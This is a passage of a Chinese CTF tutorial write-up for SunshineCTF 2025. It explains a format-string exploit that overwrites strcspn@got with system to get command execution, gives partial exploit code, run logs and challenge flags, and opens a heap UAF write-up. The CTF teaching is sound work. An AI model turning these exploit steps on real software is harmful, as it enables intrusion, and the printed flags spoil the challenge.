            \ControlFlowTok{else}\NormalTok{:          out }\OperatorTok{+=} \StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}x00}\StringTok{\textquotesingle{}}\OperatorTok{;}\NormalTok{            cur }\OperatorTok{+=} \DecValTok{1}   \CommentTok{\# 空輸出 = 該 byte 是 0x00}

\CommentTok{\# 5) 任意寫：\%14$w → *(u64*)arg[14] = arg[15]}
    \KeywordTok{def}\NormalTok{ write\_qword(}\VariableTok{self}\NormalTok{, dest, value):}
\NormalTok{        payload }\OperatorTok{=} \StringTok{b\textquotesingle{}\%\%\%d$w}\CharTok{\textbackslash{}x00}\StringTok{\textquotesingle{}} \OperatorTok{\%}\NormalTok{ ARG0                       }\CommentTok{\# "\%14$w\textbackslash{}0"}
\NormalTok{        payload }\OperatorTok{=}\NormalTok{ payload.ljust(VALS\_OFF, }\StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}x00}\StringTok{\textquotesingle{}}\NormalTok{)}
\NormalTok{        out }\OperatorTok{=} \VariableTok{self}\NormalTok{.fmt(payload }\OperatorTok{+}\NormalTok{ p64(dest) }\OperatorTok{+}\NormalTok{ p64(value))}
        \ControlFlowTok{assert}\NormalTok{ out }\OperatorTok{==} \StringTok{b\textquotesingle{}ok\textquotesingle{}}\NormalTok{, out                             }\CommentTok{\# 成功會回 "ok"（失敗就把實際輸出印出來）}

\CommentTok{\# 6) 主流程}
\NormalTok{probe }\OperatorTok{=}\NormalTok{ ch.read\_mem(}\BaseNTok{0x4010d0}\NormalTok{, }\DecValTok{8}\NormalTok{)                    }\CommentTok{\# 確認程式碼一樣（f30f1efa4154ba1f）}
\NormalTok{setvbuf }\OperatorTok{=}\NormalTok{ ch.read\_qword(}\BaseNTok{0x404020}\NormalTok{)                   }\CommentTok{\# 洩漏 libc}
\NormalTok{libc\_base }\OperatorTok{=}\NormalTok{ setvbuf }\OperatorTok{{-}}\NormalTok{ libc[}\StringTok{\textquotesingle{}setvbuf\textquotesingle{}}\NormalTok{]               }\CommentTok{\# 算 base（遠端 0x88540／本機 0x843f0）}
\ControlFlowTok{assert}\NormalTok{ ch.read\_qword(}\BaseNTok{0x404040}\NormalTok{) }\OperatorTok{{-}}\NormalTok{ libc\_base }\OperatorTok{==} \BaseNTok{0x2045c0}    \CommentTok{\# 用第二個指標交叉驗證（本機是 0x217580）}
\NormalTok{ch.write\_qword(}\BaseNTok{0x404010}\NormalTok{, libc\_base }\OperatorTok{+}\NormalTok{ libc[}\StringTok{\textquotesingle{}system\textquotesingle{}}\NormalTok{])      }\CommentTok{\# strcspn@got = system}
\NormalTok{ch.cmd(COMMANDS)                                    }\CommentTok{\# 完整 COMMANDS 見 exploit.py:161{-}162：}
                                                    \CommentTok{\#   "cat flag.txt /flag /home/*/flag.txt /app/flag.txt}
                                                    \CommentTok{\#    \textless{}本機 flag 絕對路徑\textgreater{} 2\textgreater{}/dev/null; ls {-}la; ls {-}la /; id; echo DONE"}
                                                    \CommentTok{\# → main 呼叫 system(buf)}
\end{Highlighting}
\end{Shaded}

\paragraph{\texorpdfstring{9.1 為什麼改 \texttt{strcspn@got}
就能執行指令？}{9.1 為什麼改 strcspn@got 就能執行指令？}}\label{ux70baux4ec0ux9ebcux6539-strcspngot-ux5c31ux80fdux57f7ux884cux6307ux4ee4}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
main 的迴圈每輪都做：
    read(0, buf, 0x1ff);        // 讀我們這一行
    strcspn(buf, "\n");         // ← 這一行的 GOT 被我們改成 system
\end{Verbatim}

\texttt{strcspn(buf,"\textbackslash{}\allowbreak{}n")} 的參數是
\texttt{rdi\ \allowbreak{}=\ \allowbreak{}buf}（我們這一行）、\texttt{rsi\ \allowbreak{}=\ \allowbreak{}"\textbackslash{}\allowbreak{}n"}。
把 GOT 改成 \texttt{system} 後，實際呼叫變成：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{system}\OperatorTok{(}\NormalTok{buf}\OperatorTok{,} \StringTok{"}\SpecialCharTok{\textbackslash{}n}\StringTok{"}\OperatorTok{);}      \CommentTok{// rsi 被忽略 → 等於 system(buf)}
\end{Highlighting}
\end{Shaded}

於是\textbf{我們打的每一行都會被 \texttt{/\allowbreak{}bin/\allowbreak{}sh\ \allowbreak{}-\allowbreak{}c} 執行}。

\paragraph{9.2
為什麼「只能執行一行」？（重要觀念，但只在遠端成立）}\label{ux70baux4ec0ux9ebcux53eaux80fdux57f7ux884cux4e00ux884cux91cdux8981ux89c0ux5ff5ux4f46ux53eaux5728ux9060ux7aefux6210ux7acb}

\texttt{system()} 的回傳型別是 \texttt{int}（32 bit），而
\texttt{strcspn()} 是 \texttt{size\_\allowbreak{}t}（64 bit）。
編譯器假設回傳值是乾淨的 64 bit，於是 \texttt{main} 裡有：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{  401132: c6 }\DecValTok{04} \DecValTok{04} \DecValTok{00}\NormalTok{   mov }\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\KeywordTok{rax}\OperatorTok{*}\DecValTok{1}\OperatorTok{],}\BaseNTok{0x0}   \CommentTok{; buf[rax] = 0  ← 用完整 64 bit rax}
\end{Highlighting}
\end{Shaded}

glibc 的 \texttt{system()} 只保證 \texttt{eax}
有效，\textbf{\texttt{rax} 的高 32 bit 是「未定義」} →
\texttt{{[}rsp+rax{]}} 可能變成亂七八糟的位址 → 寫入時 SIGSEGV。

實測驗證：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
把 \texttt{strcspn@got} 改成
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
遠端（Ubuntu 24.04 glibc 2.39）
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
本機（Arch glibc）
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{read}（回傳 \texttt{ssize\_\allowbreak{}t}，乾淨 64 bit） &
連送三行都存活，每行都被印出來 + \texttt{score\textgreater{}\allowbreak{}} & 同左
✓ \\
\texttt{strlen}（IFUNC 的 resolver，回傳函式位址） &
立刻爆掉（\texttt{buf{[}rax{]}} 寫到程式碼位址） & 同左 \\
\texttt{system}（回傳 \texttt{int}） &
第一行指令的輸出\textbf{完整}印出來，然後 \textbf{SIGSEGV}（不會再有
\texttt{score\textgreater{}\allowbreak{}}） &
\textbf{不會爆}，\texttt{score\textgreater{}\allowbreak{}} 照樣出現，可連送多行
※注意 \\
\end{longtable}
}

\begin{quote}
※注意 \textbf{「只能一行」是實作相依，不是通則。} 本機 Arch 的 libc
實測在改成 \texttt{system} 之後\textbf{連送三行都存活} （\texttt{ONE} /
\texttt{TWO} / \texttt{THREE} 都執行、都印出
\texttt{score\textgreater{}\allowbreak{}}）；遠端 Ubuntu 24.04 則在第一行之後就死。
原因是「高 32 bit 是未定義」------\textbf{運氣好是
0、運氣不好就是垃圾}，不同 libc／編譯方式都可能不一樣。
所以\textbf{不要依賴「本機多送幾行看看」來判斷有沒有成功}，也不要因為本機多印了一行
\texttt{score\textgreater{}\allowbreak{}} 就以為寫錯了。
\end{quote}

因此 exploit 一律把 \texttt{cat\ \allowbreak{}flag...}、\texttt{ls\ \allowbreak{}-\allowbreak{}la}、\texttt{id}
全部塞進\textbf{同一行} \texttt{sh\ \allowbreak{}-\allowbreak{}c} 指令：
這在遠端是「唯一安全」的寫法，在本機也一樣能跑。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{10.
實際執行結果}\label{ux5be6ux969bux57f7ux884cux7d50ux679c-2}

\paragraph{\texorpdfstring{10.1 本機（\texttt{./\allowbreak{}flag.\allowbreak{}txt} =
\texttt{sun\{\allowbreak{}LOCAL\_\allowbreak{}TEST\_\allowbreak{}FLAG\}\allowbreak{}}）}{10.1 本機（./flag.txt = sun\{LOCAL\_TEST\_FLAG\}）}}\label{ux672cux6a5f.flag.txt-sunlocal_test_flag}

\begin{quote}
（\textbf{節錄}：因為 \texttt{COMMANDS} \textbf{同時}執行了
\texttt{cat\ \allowbreak{}flag.\allowbreak{}txt} 與本機 flag 的絕對路徑， 所以本機的 flag
會印\textbf{兩次}；而且本機不會 SIGSEGV，結尾還會再出現一行
\texttt{score\textgreater{}\allowbreak{}}（見 §9.2）。 完整紀錄在
\texttt{pwn3/\allowbreak{}local\_\allowbreak{}run.\allowbreak{}log}。）
\end{quote}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
$ python3 exploit.py
[*] mode      : LOCAL ./revolution
[*] code probe @0x4010d0 = f30f1efa4154ba1f
[+] setvbuf@libc = 0x7f9bc94843f0   ->   libc base = 0x7f9bc9400000
[*] &_IO_2_1_stdout_ = 0x7f9bc9617580 (base+0x217580)
[+] system = 0x7f9bc9454580
[+] strcspn@got overwritten -> main() runs system(buf) on the next line
sun{LOCAL_TEST_FLAG}
sun{LOCAL_TEST_FLAG}        ← 第二次：命令裡還帶了本機 flag 的絕對路徑
total 2196
drwxr-xr-x  3 kzzz kzzz    4096 ...
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE

score>                      ← 本機不會 SIGSEGV（見 §9.2）
FLAG: sun{LOCAL_TEST_FLAG}
\end{Verbatim}

\paragraph{\texorpdfstring{10.2
遠端（\texttt{chal.\allowbreak{}sunshinectf.\allowbreak{}games:\allowbreak{}26002}）}{10.2 遠端（chal.sunshinectf.games:26002）}}\label{ux9060ux7aefchal.sunshinectf.games26002}

\begin{quote}
（\textbf{節錄}：實測輸出裡還有\textbf{一整段 \texttt{ls\ \allowbreak{}-\allowbreak{}la\ \allowbreak{}/}
的根目錄列表}，因為 \texttt{COMMANDS} 同時執行了 \texttt{ls\ \allowbreak{}-\allowbreak{}la\ \allowbreak{}/}。
完整紀錄在 \texttt{pwn3/\allowbreak{}remote\_\allowbreak{}run.\allowbreak{}log}。）
\end{quote}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
$ python3 exploit.py REMOTE
[*] mode      : REMOTE chal.sunshinectf.games:26002
[*] target libc: libc6_2.39-0ubuntu8.3 (Ubuntu 24.04)
[*] code probe @0x4010d0 = f30f1efa4154ba1f
[+] setvbuf@libc = 0x78d497ba3540   ->   libc base = 0x78d497b1b000
[*] &_IO_2_1_stdout_ = 0x78d497d1f5c0 (base+0x2045c0)
[+] system = 0x78d497b73740
[+] strcspn@got overwritten -> main() runs system(buf) on the next line
sun{cust0m_fmtstr_n0_t00ls_4ll0wed}
total 12
drwxr-xr-x 2 root root       4096 Sep 26 00:21 .
drwxr-xr-x 1 root root       4096 Sep 26 00:54 ..
-rw-r----- 1 root revolution   36 Sep 26 00:13 flag.txt
（… 這裡省略了 ls -la / 的內容 …）
uid=1337(revolution) gid=1337(revolution) groups=1337(revolution)
DONE

FLAG: sun{cust0m_fmtstr_n0_t00ls_4ll0wed}
\end{Verbatim}

（遠端在一行指令之後就不再有 \texttt{score\textgreater{}\allowbreak{}} ------ 行程
SIGSEGV，與 §9.2 的觀察一致。）

\paragraph{10.3 真實 flag}\label{ux771fux5be6-flag}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
sun{cust0m_fmtstr_n0_t00ls_4ll0wed}
\end{Verbatim}

（連續執行 4 次遠端，成功率 4/4。）

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{11.
常見坑（血淚筆記）}\label{ux5e38ux898bux5751ux8840ux6ddaux7b46ux8a18}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{\texttt{pwntools} 會吃掉 \texttt{sys.\allowbreak{}argv} 裡的純大寫單字。}
  \texttt{python3\ \allowbreak{}exploit.\allowbreak{}py\ \allowbreak{}REMOTE} 在 \texttt{from\ \allowbreak{}pwn\ \allowbreak{}import\ \allowbreak{}*}
  之後，\texttt{sys.\allowbreak{}argv} 只剩
  \texttt{{[}\textquotesingle{}\allowbreak{}exploit.\allowbreak{}py\textquotesingle{}\allowbreak{}{]}} （被當成
  \texttt{pwnlib.\allowbreak{}args} 的開關）。 → 解法：在 import pwntools
  \textbf{之前}先 \texttt{\_\allowbreak{}argv\ \allowbreak{}=\ \allowbreak{}list(sys.\allowbreak{}argv{[}1:{]})} 存一份。
  \textgreater{} ※提示 如果你用的是 pwntools 官方的
  \texttt{args.\allowbreak{}REMOTE}（\texttt{wp/\allowbreak{}00\_\allowbreak{}基礎知識\_\allowbreak{}從零開始.\allowbreak{}md} §12
  的骨架），那不用理這條 ------ \textgreater{} 實測 \texttt{sys.\allowbreak{}argv}
  會從
  \texttt{{[}\textquotesingle{}\allowbreak{}-\allowbreak{}c\textquotesingle{}\allowbreak{},\allowbreak{}\textquotesingle{}\allowbreak{}REMOTE\textquotesingle{}\allowbreak{}{]}}
  變成 \texttt{{[}\textquotesingle{}\allowbreak{}-\allowbreak{}c\textquotesingle{}\allowbreak{}{]}}，但同一時間
  \textbf{\texttt{args.\allowbreak{}REMOTE\ \allowbreak{}==\ \allowbreak{}True}}。 \textgreater{}
  會出問題的只有「自己解析 \texttt{sys.\allowbreak{}argv{[}1{]}}」的寫法（本 exploit
  就是這種）。
\item
  \textbf{值的 \texttt{\textbackslash{}\allowbreak{}x00}
  一定要放在「格式字串結束之後」。} 解析器遇到
  \texttt{\textbackslash{}\allowbreak{}x00} 就停，但 \texttt{get\_\allowbreak{}arg}
  讀的是記憶體，不受影響。 所以佈局必須是
  \texttt{"\%\allowbreak{}14\$\allowbreak{}w\textbackslash{}\allowbreak{}0"\ \allowbreak{}+\ \allowbreak{}padding\ \allowbreak{}+\ \allowbreak{}{[}dest{]}{[}value{]}}；把含
  \texttt{\textbackslash{}\allowbreak{}x00} 的 qword 放在 \texttt{\textbackslash{}\allowbreak{}0}
  前面， 整個 specifier 就不會被解析（而且 \texttt{read}
  進來的資料仍然完整）。
\item
  \textbf{\texttt{\%\allowbreak{}N\$\allowbreak{}s} 是 \texttt{strlen} 版本，不是
  \texttt{memcpy}。} 指標最低位 byte 是 \texttt{0x00}
  時輸出會是空的（不是 0）。 → 必須用「逐 byte
  探測」：讀到空輸出就代表那個 byte 是 \texttt{0x00}。 \textgreater{}
  ※注意 逐 byte 探測\textbf{只適用於「確定整段都在同一個 mapped
  區域」的位址}（本題都是 \texttt{0x400000} \textgreater{}
  附近的程式／資料段）。只要 \texttt{\%\allowbreak{}N\$\allowbreak{}s}
  收到的指標指到\textbf{沒有映射的頁}，\texttt{strlen} 就會 SIGSEGV，
  \textgreater{} 整個連線當場死掉。拿它去亂掃記憶體是自殺 ------
  這也是為什麼 exploit 只讀固定的那幾個 \textgreater{} GOT／COPY
  位址（\texttt{0x404000}--\texttt{0x404068}）。
\item
  \textbf{\texttt{strlen} / \texttt{strcspn} 是 IFUNC。} GOT
  裡存的是「被挑中的實作」（如 \texttt{\_\allowbreak{}\_\allowbreak{}strcspn\_\allowbreak{}avx2}），不是
  \texttt{readelf\ \allowbreak{}-\allowbreak{}s} 看到的符號 offset。 我一開始拿
  \texttt{strcspn@got} 的值去比對 libc offset，得到「strcspn 比 write
  還高」的荒謬結論， 差點以為遠端跑的是另一份 binary。\textbf{別拿 IFUNC
  符號做指紋}，改用
  \texttt{read}/\texttt{write}/\texttt{setvbuf}/\texttt{stdout}。
\item
  \textbf{本機 libc ≠ 遠端 libc。} 本機是
  Arch（\texttt{setvbuf=0x843f0,\allowbreak{}\ \allowbreak{}system=0x54580}），遠端是 Ubuntu
  24.04（\texttt{0x88540\ \allowbreak{}/\allowbreak{}\ \allowbreak{}0x58740}）。 直接把本機 offset 拿去打遠端
  100\% 失敗。 → 用「與 ASLR 無關的差值」對照真實 libc
  檔（\texttt{readelf\ \allowbreak{}-\allowbreak{}s} / pwntools
  \texttt{ELF.\allowbreak{}symbols}）找出正確版本。
\item
  \textbf{\texttt{system} 會回傳 \texttt{int}，高 32 bit 是「未定義」→
  遠端會在一行之後 SIGSEGV，所以所有指令要塞進同一行 \texttt{sh\ \allowbreak{}-\allowbreak{}c}。}
  本機 Arch glibc
  實測「不會」爆（可連送多行），但\textbf{不要依賴這個行為}：不同的
  libc／編譯方式都可能讓高 32 bit 帶著垃圾，\texttt{buf{[}rax{]}\ \allowbreak{}=\ \allowbreak{}0}
  就會寫到野位址。exploit 一律塞同一行是唯一安全的寫法。見 §9.2。
\item
  \textbf{不要相信題目提示裡的「\texttt{.\allowbreak{}bss\ \allowbreak{}0x4060} 的 16-bit
  長度整數溢位 + \texttt{memcpy}」說法。} 我照著驗證過：

  \begin{itemize}
  \tightlist
  \item
    \texttt{0x4060} 根本不在 \texttt{.\allowbreak{}bss}（\texttt{.\allowbreak{}bss} 是
    \texttt{0x404040}--\texttt{0x404070}），\texttt{0x404060} 是
    \textbf{stderr 的 COPY relocation 欄位}。
  \item
    這支程式\textbf{沒有匯入 \texttt{memcpy}}（\texttt{readelf\ \allowbreak{}-\allowbreak{}s} 只有
    write/strlen/strcspn/read/setvbuf）。
  \item
    \texttt{0x401540} 的 16 進位轉換只是把 18 bytes 寫進 printf
    自己堆疊框的暫存區，安全。 真正的原因在 §4.1 /
    §6：\texttt{overflow\_\allowbreak{}arg\_\allowbreak{}area} 初始化成 \texttt{buf}。
    \textbf{每個位址/機制都要自己用 \texttt{objdump}/\texttt{gdb}
    驗證，不要沿用別人的猜測。}
  \end{itemize}
\item
  \textbf{\texttt{\%\allowbreak{}\textless{}\allowbreak{}數字\textgreater{}\allowbreak{}x}（沒有
  \texttt{\$\allowbreak{}}）不會做事。} 數字後面不是 \texttt{\$\allowbreak{}} 時，程式直接跳到
  \texttt{0x401480} 把格式字元吞掉。 想用 \texttt{\%\allowbreak{}p} 洩漏一定要寫成
  \texttt{\%\allowbreak{}N\$\allowbreak{}p}。
\item
  \textbf{輸出解析不要用 \texttt{recvline()}。}
  洩漏出來的是\textbf{二進位}，裡面可能含 \texttt{0x0a}。 用
  \texttt{recvuntil(b\textquotesingle{}\allowbreak{}score\textgreater{}\allowbreak{}\ \allowbreak{}\textquotesingle{}\allowbreak{})}
  再砍掉結尾的 \texttt{\textbackslash{}\allowbreak{}n} 才穩。
\item
  \textbf{\texttt{\%\allowbreak{}N\$\allowbreak{}w} 成功時會印
  \texttt{ok}}，拿它當寫入成功的確認訊號很方便。
\item
  \textbf{偏移計算}：\texttt{buf+0x40} 對應參數
  \texttt{N\ \allowbreak{}=\ \allowbreak{}6\ \allowbreak{}+\ \allowbreak{}0x40/\allowbreak{}8\ \allowbreak{}=\ \allowbreak{}14}。
  記法：\texttt{N\ \allowbreak{}=\ \allowbreak{}6\ \allowbreak{}+\ \allowbreak{}offset/\allowbreak{}8}。想改放資料的位置，記得同步改
  specifier 裡的數字。
\item
  \textbf{\texttt{0x4013f9} 的 \texttt{\%\allowbreak{}\%\allowbreak{}}}：格式字串裡想印一個
  \texttt{\%\allowbreak{}} 要寫 \texttt{\%\allowbreak{}\%\allowbreak{}}；不過本題我們都用
  \texttt{\%\allowbreak{}14\$\allowbreak{}...}，用不到。
\end{enumerate}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{12. 附錄}\label{ux9644ux9304}

\paragraph{12.1 位址速查表}\label{ux4f4dux5740ux901fux67e5ux8868}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
位址
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
內容
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{0x401020} &
PLT0（\texttt{push\ \allowbreak{}link\_\allowbreak{}map;\ \allowbreak{}jmp\ \allowbreak{}\_\allowbreak{}dl\_\allowbreak{}runtime\_\allowbreak{}resolve}） \\
\texttt{0x401080/\allowbreak{}90/\allowbreak{}a0/\allowbreak{}b0/\allowbreak{}c0} & \texttt{write@plt} / \texttt{strlen@plt}
/ \texttt{strcspn@plt} / \texttt{read@plt} / \texttt{setvbuf@plt} \\
\texttt{0x4010d0} & \texttt{main} \\
\texttt{0x401190} & stdio 初始化（對 stdout/stderr 做
\texttt{setvbuf(\_\allowbreak{}IONBF)}） \\
\texttt{0x4012c0} & \texttt{get\_\allowbreak{}arg}（自製 \texttt{va\_\allowbreak{}arg}） \\
\texttt{0x401330} & 自製 \texttt{printf} \\
\texttt{0x4014cd} & \texttt{\%\allowbreak{}N\$\allowbreak{}w}（任意寫）的處理器 \\
\texttt{0x401540} & \texttt{\%\allowbreak{}N\$\allowbreak{}p} 的處理器 \\
\texttt{0x40159d} & \texttt{\%\allowbreak{}N\$\allowbreak{}s}（任意讀）的處理器 \\
\texttt{0x402004} & \texttt{"\%\allowbreak{}"} \\
\texttt{0x402006} & \texttt{"ok"} \\
\texttt{0x402009} & \texttt{"0123456789abcdef"} \\
\texttt{0x40201a} & \texttt{"score\textgreater{}\allowbreak{}\ \allowbreak{}"} \\
\texttt{0x402022} & \texttt{"\textbackslash{}\allowbreak{}n"} \\
\texttt{0x402028} &
\texttt{"===\ \allowbreak{}PRINT\ \allowbreak{}PRINT\ \allowbreak{}REVOLUTION\ \allowbreak{}===\textbackslash{}\allowbreak{}n"} \\
\texttt{0x402048} &
\texttt{"Enter\ \allowbreak{}your\ \allowbreak{}score\ \allowbreak{}card\ \allowbreak{}template:\allowbreak{}\textbackslash{}\allowbreak{}n"} \\
\texttt{0x40206a} & \texttt{"0x"} \\
\texttt{0x404000} & \texttt{write@got} \\
\texttt{0x404010} & \texttt{strcspn@got} ← 改成 \texttt{system} \\
\texttt{0x404020} & \texttt{setvbuf@got} ← 洩漏來源 \\
\texttt{0x404040} & \texttt{\&\allowbreak{}\_\allowbreak{}IO\_\allowbreak{}2\_\allowbreak{}1\_\allowbreak{}stdout\_\allowbreak{}}（COPY reloc） \\
\texttt{0x404060} & \texttt{\&\allowbreak{}\_\allowbreak{}IO\_\allowbreak{}2\_\allowbreak{}1\_\allowbreak{}stderr\_\allowbreak{}}（COPY reloc） \\
\end{longtable}
}

\paragraph{12.2 執行方式}\label{ux57f7ux884cux65b9ux5f0f}

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{cd}\NormalTok{ /home/kzzz/Documents/code/ctf/sunshine/pwn3}
\ExtensionTok{python3}\NormalTok{ exploit.py            }\CommentTok{\# 本機（需要 flag.txt）}
\ExtensionTok{python3}\NormalTok{ exploit.py REMOTE     }\CommentTok{\# 遠端 chal.sunshinectf.games:26002}
\end{Highlighting}
\end{Shaded}

\paragraph{12.3 檔案清單}\label{ux6a94ux6848ux6e05ux55ae}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
檔案
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
說明
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{exploit.\allowbreak{}py} & 最終 exploit（本機 / 遠端兩種模式） \\
\texttt{FLAG.\allowbreak{}txt} & 真實 flag \\
\texttt{notes.\allowbreak{}md} & 本教學筆記 \\
\texttt{NOTES\_\allowbreak{}SUMMARY.\allowbreak{}txt} & 給上層 agent 的 30 行摘要 \\
\texttt{rev.\allowbreak{}asm} & \texttt{objdump\ \allowbreak{}-\allowbreak{}d\ \allowbreak{}-\allowbreak{}M\ \allowbreak{}intel\ \allowbreak{}revolution}
的完整輸出（可自行對照） \\
\texttt{local\_\allowbreak{}run.\allowbreak{}log} / \texttt{remote\_\allowbreak{}run.\allowbreak{}log} & 實際執行紀錄 \\
\texttt{libc-\allowbreak{}2.\allowbreak{}39-\allowbreak{}0ubuntu8.\allowbreak{}3.\allowbreak{}so.\allowbreak{}6} & 從 Ubuntu 套件取出的遠端
libc（用於核對 offset） \\
\texttt{flag.\allowbreak{}txt} & 本機測試用假 flag \\
\end{longtable}
}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{13.
一頁式心智模型}\label{ux4e00ux9801ux5f0fux5fc3ux667aux6a21ux578b}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
┌───────────────┐   read(0, buf, 0x1ff)   ┌──────────────────────────────┐
│  使用者的輸入  │ ──────────────────────> │ main 的 buf (== rsp, 0x200) │
└───────────────┘                         └──────────────┬───────────────┘
                                                                         │ call printf(buf)
                                                         ▼
                             ┌────────────────────────────────────────────┐
                             │ printf: overflow_arg_area = rsp+0x120 = buf│
                             │  → 第 6 個以後的「可變參數」= 使用者的輸入 │
                             └───────┬───────────────────┬────────────────┘
                                     │                                    │
                        %N$s  任意讀 │                                    │ %N$w  任意寫
                                     ▼                   ▼
                    leak *(u64*)0x404020           *(u64*)0x404010 = system
                     → libc base = v - 0x88540      (strcspn@got ← system)
                                     │                   │
                                     └─────────┬─────────┘
                                               ▼
                              main 下一輪: system(我們這一行) → shell
                                               ▼
                                 cat flag.txt → sun{cust0m_fmtstr_n0_t00ls_4ll0wed}
\end{Verbatim}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\section{Part 5 --- pwn4 cache\_money（Heap
UAF）}\label{part-5-pwn4-cache_moneyheap-uaf}

\begin{quote}
原始檔案：\texttt{pwn4/\allowbreak{}notes.\allowbreak{}md}
\end{quote}

\subsection{\texorpdfstring{SunShineCTF 2025 --- pwn4
\texttt{cache\_\allowbreak{}money}
完整教學筆記}{SunShineCTF 2025 --- pwn4 cache\_money 完整教學筆記}}\label{sunshinectf-2025-pwn4-cache_money-ux5b8cux6574ux6559ux5b78ux7b46ux8a18}

\begin{quote}
這份筆記是寫給\textbf{完全沒碰過 heap exploit、也不知道 ROP/SROP
是什麼}的人看的。 我們會從「暫存器是什麼」開始，一路講到「為什麼
safe-linking 擋不住這個漏洞」。 所有位址、offset、chunk 大小都是我在 gdb
裡\textbf{實際看到}的，不是猜的。

※ \textbf{閱讀順序建議}：完全沒學過 heap 的話，先讀
\texttt{wp/\allowbreak{}99\_\allowbreak{}速查表.\allowbreak{}md} §8（chunk / bin / tcache / safe-linking
的迷你版），再回來讀本檔 §5（完整版）。 同一手法在
pwn6（\texttt{code\_\allowbreak{}breaker}）會再用一次，那份筆記的 §4 會回頭引用本檔
§5。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{1. 題目資訊}\label{ux984cux76eeux8cc7ux8a0a-3}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
項目
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
內容
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
檔案 & \texttt{cache\_\allowbreak{}money}（x86-64 ELF，stripped 沒有符號表） \\
遠端 & \texttt{chal.\allowbreak{}sunshinectf.\allowbreak{}games:\allowbreak{}26004} \\
Flag 格式 & \texttt{sun\{\allowbreak{}...\allowbreak{}\}\allowbreak{}} \\
真實 flag & \texttt{sun\{\allowbreak{}s4fe\_\allowbreak{}l1nk1ng\_\allowbreak{}w0nt\_\allowbreak{}s4ve\_\allowbreak{}y0ur\_\allowbreak{}tc4che\}\allowbreak{}} \\
編譯環境 &
\texttt{GCC:\allowbreak{}\ \allowbreak{}(Ubuntu\ \allowbreak{}13.\allowbreak{}3.\allowbreak{}0-\allowbreak{}6ubuntu2\textasciitilde{}\allowbreak{}24.\allowbreak{}04)} → Ubuntu
24.04，\textbf{glibc 2.39} \\
程式類型 & 純 heap 題（wallet manager），沒有任何 stack overflow \\
\end{longtable}
}

執行起來的畫面：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
============================================
   $$$ CACHE MONEY Crypto Wallet Manager $$$
       "Your coins, our heap."
============================================

--- MAIN MENU ---
1) Open Wallet
2) Deposit (write to ledger)
3) Withdraw (read from ledger)
4) Transfer
5) Close Wallet
6) List Wallets
0) Exit
>>>
\end{Verbatim}

\paragraph{檔案清單（我的工作目錄）}\label{ux6a94ux6848ux6e05ux55aeux6211ux7684ux5de5ux4f5cux76eeux9304}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
cache_money              題目本體（non-PIE, stripped）
exploit.py               最終 exploit（local / REMOTE）
FLAG.txt                 真實遠端 flag
